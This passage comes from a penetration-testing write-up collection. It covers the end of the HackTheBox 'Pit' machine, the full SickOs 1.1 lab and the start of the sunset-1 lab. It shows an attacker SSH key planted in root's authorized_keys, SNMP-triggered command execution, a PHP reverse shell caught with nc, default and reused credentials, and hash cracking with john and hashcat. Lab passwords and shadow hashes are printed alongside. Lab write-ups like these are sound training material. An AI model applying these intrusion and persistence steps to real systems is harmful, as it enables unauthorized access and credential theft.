echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMR1r7B7aiEe6j+wBsVumAFqFXCiqw2iSrcg1S7rC1BdlVqr8YfWnT6e/e3+TAJk9idtLz/wN2MkupWtI1ddtNTJz31RQb0WMGjq7p8Usg0uIYhQH0PTN/GmPXDhqLIPcbTnNQMcV2PnwM07eXxQH0+s9rqVO8cR2z2f35bKe3WrHNnT7NwfOoWqNJxh+V8OGgfF8LhS0E46I6co76MJAIsX24Zs9r/dY+JPOlJlS3K2Kf3xSfPAScQeWip1WYY9depVuQywk12kOUikzGNjlQ4phNba47VjfycyV34cLw0/vQcDv5hMCfaK+hoE5rBXysnVx/f3n3zRYMLomgveQUCLBYUwJPE2t0VzeeX4W9wxrAOl2Njx5TI4cEFnmlp/6lO/iK+aC6BSBRxU19jS2fUchiN9PMgLSYGzhuIxOLvvd9AlaOYPNM7a5AfjzzO+gd1fv/Mb9EIZCKibtvpHp0eomnSDcDz/b9FNpbvg6V5NBVy2VaufcRbiBDD6cTS00= root@kali" > /root/.ssh/authorized_keys
```

Note: Root is running a clean-up script, the contents of monitoring directory gets removed after
5 minutes.

After copying our shell file, now we need to run SNMPwalk application from Kali Linux to
execute it remotely.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pit]
└─# snmpwalk -v 1 -c public pit.htb 1.3.6.1.4.1.8072.1.3.2.2.1.2
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
```

Note: ‘1.3.6.1.4.1.8072.1.3.2’ is called as OID (Object Identifiers). It is an address used to
uniquely identify managed devices and their statuses in a network.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1983.jpg)

We can easily match the number for the following numbers 1.3.6.1.4.1 with above SNMP MIB
(management information base) tree structure. The following number 8072 is device/application
manufacturer (netSnmp) and remaining numbers 1.3.2.2.1.2 are part of netExtensions. Below is
the complete description of OID.

 - [OID repository - 1.3.6.1.4.1.8072.1.3.2.2.1.2 = {iso(1) identified-organization(3) dod(6)
internet(1) private(4) enterprise(1) 8072 netSnmpObjects(1) nsExtensions(3)
nsExtendObjects(2) nsExtendConfigTable(2) nsExtendConfigEntry(1) nsExtendCommand(2)}](http://www.oid-info.com/cgi-bin/display?oid=1.3.6.1.4.1.8072.1.3.2.2.1.2&a=display)

``` bash
{iso(1) identified-organization(3) dod(6) internet(1) private(4) enterprise(1) 8072
netSnmpObjects(1) nsExtensions(3) nsExtendObjects(2) nsExtendConfigTable(2)
nsExtendConfigEntry(1) nsExtendCommand(2)}
```

 - [What is the SNMP OID? How do you use it?](https://www.dpstele.com/snmp/what-does-oid-network-elements.php)

``` bash
.1.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: /usr/
bin/monitor
```

As you can see the OID value is given for a string and that string is monitor script. When we run
SNMPwalk from Kali Linux, on target root runs on behalf to execute those script.

Upon SNMPwalk on OID value, we can SSH into machine and read our root flag.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pit]
└─# snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects
MIB search path: /root/.snmp/mibs:/usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
Cannot find module (MY-MIB): At line 1 in (none)
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: Memory usage
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       379Mi       3.1Gi       8.0Mi       330Mi       3.2Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 14:30:54 up  2:26,  1 user,  load average: 0.00, 0.00, 0.00
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."monitoring" = INTEGER: 31
NET-SNMP-EXTEND-MIB::nsExtendResult."monitoring" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".1 = STRING: Memory usage
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".2 = STRING:               total        used        free      shared  buff/cache   available
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".3 = STRING: Mem:          3.8Gi       379Mi       3.1Gi       8.0Mi       330Mi       3.2Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".4 = STRING: Swap:         1.9Gi          0B       1.9Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".5 = STRING: Database status
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".6 = STRING: OK - Connection to database successful.
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".7 = STRING: System release info
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".8 = STRING: CentOS Linux release 8.3.2011
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".9 = STRING: SELinux Settings
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".10 = STRING: user
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".11 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".12 = STRING:                 Labeling   MLS/       MLS/                          
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".13 = STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".14 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".15 = STRING: guest_u         user       s0         s0                             guest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".16 = STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".17 = STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".18 = STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".19 = STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".20 = STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".21 = STRING: user_u          user       s0         s0                             user_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".22 = STRING: xguest_u        user       s0         s0                             xguest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".23 = STRING: login
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".24 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".25 = STRING: Login Name           SELinux User         MLS/MCS Range        Service
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".26 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".27 = STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".28 = STRING: michelle             user_u               s0                   *
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".29 = STRING: root                 unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".30 = STRING: System uptime
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".31 = STRING:  14:31:07 up  2:26,  1 user,  load average: 0.00, 0.00, 0.00
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".31 = No more variables left in this MIB View (It is past the end of the MIB tree)
┌──(root💀kali)-[~/hackthebox/machine/pit]
└─# ssh -i id_rsa root@10.10.10.241                                                      
Web console: https://pit.htb:9090/

Last login: Mon May 10 11:42:46 2021
[root@pit ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@pit ~]# whoami
root
[root@pit ~]# cat root.txt 
cfcabb6990fb551b2b4627fb4e786946
[root@pit ~]# cat /etc/shadow | grep root
root:$6$4ZnZ0Iv3NzFIZtKa$tA78wgAwaBBSg96ecMRPYIogQmANo/9pJhHmf06bCmbKukMDM9rdT2Mdc6UhwD1raDzXIrk.zjQ9lkJIoLShE.:18757:0:99999:7:::
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1984.jpg)

#### Cleanup Script

``` bash
[root@pit ~]# cat cleanup.sh 
#!/bin/bash

# Remove attached files (keep "Upgrade Note")
for d in `/usr/bin/find /var/www/html/seeddms51x/data/1048576/ -mindepth 1 -type d -mmin +5 -not -name 21`
do
  rm -rf $d
  id=${d##*/}
  /usr/bin/mysql -u root -p'ek)aizee^FaiModa~ce]z6c' seeddms <<DELETE_QUERY
DELETE FROM tblDocumentContent where id = $id;
DELETE FROM tblDocuments where id = $id;
DELETE_QUERY
done

# Restore monitoring scripts
/usr/bin/rm -rf /usr/local/monitoring/*
/usr/bin/cp /root/monitoring/* /usr/local/monitoring
/usr/bin/chmod 700 /usr/local/monitoring/*

# Clean /tmp directory
/usr/bin/rm -rf /tmp/*

# Restart php-fpm
/usr/bin/systemctl restart php-fpm.service

# Clean authorized_keys
> /root/.ssh/authorized_keys
```

#### Summary of knowledge

 - snmp information gathering
 - SeedDMS versions < 5.1.11 - Remote Command Execution
 - MYSQL creds leak in settings.xml
 - to get shell script excecute by SNMP OID
 - Permission misconfiguration privesclation

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end pit -->

</details>

<a id="case-sickos-1-1"></a>

## 代理可达性与 CMS 文件权限

Squid 代理决定 Web 服务可达性，后台认证和上传连接到本地用户。原记录保留账户复用与权限观察。

<p class="kb-provenance">来源 SickOs-1-1 · 原记录 2020-03-27 · 13 个代码块 · 6 处图片引用</p>

<details class="kb-evidence" id="record-sickos-1-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start SickOs-1-1 -->

#### 名称
名称：SickOs: 1.1
发布日期：2015年12月11日

#### 下载

 - Download (Mirror): https://download.vulnhub.com/sickos/sick0s1.1.7z
 - Download (Torrent): https://download.vulnhub.com/sickos/sick0s1.1.7z.torrent



#### 描述

``` bash
Name........: SickOs1.1
Date Release: 11 Dec 2015
Author......: D4rk
Series......: SickOs
Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt
Tester(s)...: h1tch1
Twitter.....: https://twitter.com/D4rk36
```

``` bash
该CTF明确地类比了如何在网络上执行黑客策略，以在安全的环境中危害网络。这个虚拟与在OSCP中遇到的实验室非常相似。目的是破坏网络/计算机并在其上获得管理root权限。
```

文件信息：

``` bash
FileName: sick0s1.1.7z
File Size: 652.52 MB
MD5: 396e46897c54da6ded6604b861c806b7
SHA1: 3578a10ba92f860c2f0d8934ec5a9bbffc4c7859
```

虚拟机：

``` bash
Format: 7z
Operating System: Ubuntu
Tested: VMware Workstation 11.0.0 build-2305329
```

联网：

``` bash
DHCP服务：已启用
IP地址：自动分配
```

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.66.*
Nmap scan report for 192.168.66.13
Host is up (0.00011s latency).
MAC Address: 00:0C:29:A3:1D:35 (VMware)
```

``` bash
root@kali:~# nmap -p- -sV -v 192.168.66.13
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
3128/tcp open   http-proxy Squid http proxy 3.1.19
8080/tcp closed http-proxy
```

``` bash
root@kali:~# nmap -p 22,3128,8080 -A -T4 -v 192.168.66.13 --script=vuln
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-server-header: squid/3.1.19
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| vulners: 
|   cpe:/a:squid-cache:squid:3.1.19: 
|       CVE-2016-4054   6.8     https://vulners.com/cve/CVE-2016-4054
|       CVE-2016-4052   6.8     https://vulners.com/cve/CVE-2016-4052
|       CVE-2016-4051   6.8     https://vulners.com/cve/CVE-2016-4051
|       CVE-2014-7142   6.4     https://vulners.com/cve/CVE-2014-7142
|       CVE-2014-7141   6.4     https://vulners.com/cve/CVE-2014-7141
|       CVE-2016-4556   5.0     https://vulners.com/cve/CVE-2016-4556
|       CVE-2016-4555   5.0     https://vulners.com/cve/CVE-2016-4555
|       CVE-2016-10002  5.0     https://vulners.com/cve/CVE-2016-10002
|       CVE-2012-5643   5.0     https://vulners.com/cve/CVE-2012-5643
|_      CVE-2016-4053   4.3     https://vulners.com/cve/CVE-2016-4053
8080/tcp closed http-proxy
```

在nmap扫描期间观察到3128上存在有关代理的内容，那么尝试在firefox浏览器中手动建立代理。在HTTP代理和端口3128中提供VM的IP，如下图所示：

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub223.jpg)

访问robotx.txt文件，查看里面的内容，然后进入wolfcms目录

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub224.jpg)
 
 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub225.jpg)

#### getshell

对Wolf CMS不太了解，所以搜索了Google以了解后台管理页面的位置。当通过Google找到登录页面时，将其打开。需要用户名和密码。默认情况下，用户名和密码分别为admin和admin，登录到管理控制台，然后选择文件选项卡，然后选择上传文件选项。

后台

``` bash
http://192.168.66.13/wolfcms/?/admin/login
```

账号密码：admin/admin

进入之后找到上传点上传php-reverse-shell

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub226.jpg)

然后浏览器访问phpreverseshell,在kali端使用nc监听，反弹回了shell

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
192.168.66.13: inverse host lookup failed: Unknown host
connect to [192.168.66.6] from (UNKNOWN) [192.168.66.13] 44079
Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 10:47:19 up  1:40,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ pwd 
/
```

#### 提权

查看/etc/passwd文件

``` bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
```

在网站根目录下面找到配置文件中的数据库用户名和密码如下

``` bash
$ pwd
/var/www/wolfcms
$ cat config.php
<?php 

// Database information:
// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
// The path can only be absolute path or :memory:
// For more info look at: www.php.net/pdo

// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');

...
```

观察它提供的所有用户详细信息，会发现用户sickos的值为1000:1000，这意味着sickos是第一个用户。因此，在这里嗅到了root权限用户的气味，因为它是第一个用户。因此，使用发现的密码john@123将用户切换为sickos。

``` bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@SickOs:/var/www/wolfcms$ ls
ls
CONTRIBUTING.md  composer.json  docs         index.php  robots.txt
README.md        config.php     favicon.ico  public     wolf
www-data@SickOs:/var/www/wolfcms$ su sickos
su sickos
Password: john@123

sickos@SickOs:/var/www/wolfcms$ id
id
uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
sickos@SickOs:/var/www/wolfcms$ whoami
whoami
sickos
sickos@SickOs:/var/www/wolfcms$ cd /root
cd /root
bash: cd: /root: Permission denied
sickos@SickOs:/var/www/wolfcms$ sudo -s
sudo -s
[sudo] password for sickos: john@123

root@SickOs:/var/www/wolfcms# id
id
uid=0(root) gid=0(root) groups=0(root)
root@SickOs:/var/www/wolfcms# whoami
whoami
root
root@SickOs:/var/www/wolfcms# cd /root
cd /root
root@SickOs:/root# ls
ls
a0216ea4d51874464078c618298b1367.txt
root@SickOs:/root# cat a0216ea4d51874464078c618298b1367.txt
cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub227.jpg)

到此为止成功获取到了root权限并读取了flag

#### 其它提权方法参考

 - [2015-slickOs-1.1](https://github.com/kingbobi/ctf-writeup/tree/master/2015/slickOs-1.1)
 - [write-up-sickos-1-1](https://blog.christophetd.fr/write-up-sickos-1-1/)
 - [vulnhub-writeup-SickOs-1-1](https://github.com/zionspike/vulnhub-writeup/blob/master/sick0s%201.1/kapi-note.md)

就是利用ShellShock漏洞和自动定时任务提权,很简单，在这里就不多做演示了


#### 知识点总结

 - 浏览器设置http-proxy Squid http proxy代理访问
 - 弱口令
 - 文件上传
 - 用户值为1000:1000-第一用户提权

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end SickOs-1-1 -->

</details>

<a id="case-sunset-1"></a>

## FTP 备份哈希与编辑器权限

匿名 FTP 中的备份连接 Linux 用户哈希，后续 sudo ed 的命令能力决定 root 权限。破解方式与编辑器交互均留存。

<p class="kb-provenance">来源 sunset-1 · 原记录 2020-04-14 · 9 个代码块 · 3 处图片引用</p>

<details class="kb-evidence" id="record-sunset-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start sunset-1 -->

#### 名称
名称：sunset: 1
发布日期：2019年7月29日

#### 下载

sunset.zip

 - Download: https://mega.nz/#!AGZU1C6J!y_Pc0BEJ2EsAFiBeUY91s4e9mgrlo8sN4aT3wKVen6s
 - Download (Mirror): https://download.vulnhub.com/sunset/sunset.zip
 - Download (Torrent): https://download.vulnhub.com/sunset/sunset.zip.torrent



#### 描述

N/A

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.*
Nmap scan report for 192.168.56.123
Host is up (0.00016s latency).
MAC Address: 08:00:27:89:F0:14 (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -v -p- -sV 192.168.56.123
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.5
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
```

``` bash
root@kali:~# nmap -p 21,22 -v -A -T4 --script=vuln 192.168.56.123
PORT   STATE SERVICE VERSION
21/tcp open  ftp     pyftpdlib 1.5.5
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
```

通过尝试发现可以通过anonymous用户登录ftp

#### 列举

不出所料，尝试使用匿名用户登录ftp，并成功完成了此操作，此后在那里获得了一个名为“ backup”的文件。首先将该文件保存在系统中，然后打开该文件并得到五个用户的哈希值。

``` bash
root@kali:~/vulnhub/sunset# ftp 192.168.56.123
Connected to 192.168.56.123.
220 pyftpdlib 1.5.5 ready.
Name (192.168.56.123:root): anonymous
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-r--r--   1 root     root         1062 Jul 29  2019 backup
226 Transfer complete.
ftp> get backup
local: backup remote: backup
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
1062 bytes received in 0.01 secs (135.0579 kB/s)
ftp> quit
221 Goodbye.
root@kali:~/vulnhub/sunset# ls
backup
root@kali:~/vulnhub/sunset# cat backup 
CREDENTIALS:                                                                                                                                                                                                       
office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.                                                                                                                  
datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/                                                                                                              
sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0                                                                                                                     
sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/
```

复制这些hash并将其保存在名为hash的文件中，然后将在crack工具john的帮助下破解用户“sunset”找到密码“ cheer14”的hash。下一步使用此用户名和密码通过ssh连接。

``` bash
root@kali:~/vulnhub/sunset# john hash
Warning: detected hash type "HMAC-SHA256", but the string is also recognized as "HMAC-SHA512"
Use the "--format=HMAC-SHA512" option to force loading these as that type instead
Warning: only loading hashes of type "HMAC-SHA256", but also saw type "sha512crypt"
Use the "--format=sha512crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 10 candidates buffered for the current salt, minimum 32 needed for performance.
Warning: Only 11 candidates buffered for the current salt, minimum 32 needed for performance.
Warning: Only 29 candidates buffered for the current salt, minimum 32 needed for performance.
Warning: Only 20 candidates buffered for the current salt, minimum 32 needed for performance.
Warning: Only 26 candidates buffered for the current salt, minimum 32 needed for performance.
Warning: Only 29 candidates buffered for the current salt, minimum 32 needed for performance.
Warning: Only 8 candidates buffered for the current salt, minimum 32 needed for performance.
Warning: Only 16 candidates buffered for the current salt, minimum 32 needed for performance.
Warning: Only 31 candidates buffered for the current salt, minimum 32 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 15 candidates buffered for the current salt, minimum 32 needed for performance.
Further messages of this type will be suppressed.
To see less of these warnings, enable 'RelaxKPCWarningCheck' in john.conf
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
```

john太慢，半天出不了结果，如果电脑显卡配置好的话，可以如下选用rockyou.txt字典并使用hashcat来破解密码

``` bash
D:\hashcat-5.1.0\hashcat-5.1.0>hashcat64.exe -a 0 -m 1800 password.txt rockyou.txt
hashcat (v5.1.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #2: Intel's OpenCL runtime (GPU only) is currently broken.
             We are waiting for updated OpenCL drivers from Intel.
             You can use --force to override, but do not report related errors.
nvmlInit(): Unknown Error

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU

OpenCL Platform #2: Intel(R) Corporation
========================================
* Device #2: Intel(R) UHD Graphics 630, skipped.
* Device #3: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.

Hashes: 5 digests; 5 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Uses-64-Bit

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger set to 90c

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344367
* Bytes.....: 139921318
* Keyspace..: 14344360
* Runtime...: 3 secs

$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/:space
$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/:cheer14
Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password- and salt-length (typically down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Update your OpenCL runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0:sky
[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>

Session..........: hashcat
Status...........: Running
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: password.txt
Time.Started.....: Wed Apr 15 10:29:47 2020 (59 secs)
Time.Estimated...: Wed Apr 15 10:42:31 2020 (11 mins, 45 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    18801 H/s (10.91ms) @ Accel:64 Loops:32 Thr:32 Vec:1
Recovered........: 3/5 (60.00%) Digests, 1/2 (50.00%) Salts
Progress.........: 2162688/28688720 (7.54%)
Rejected.........: 0/2162688 (0.00%)
Restore.Point....: 1081344/14344360 (7.54%)
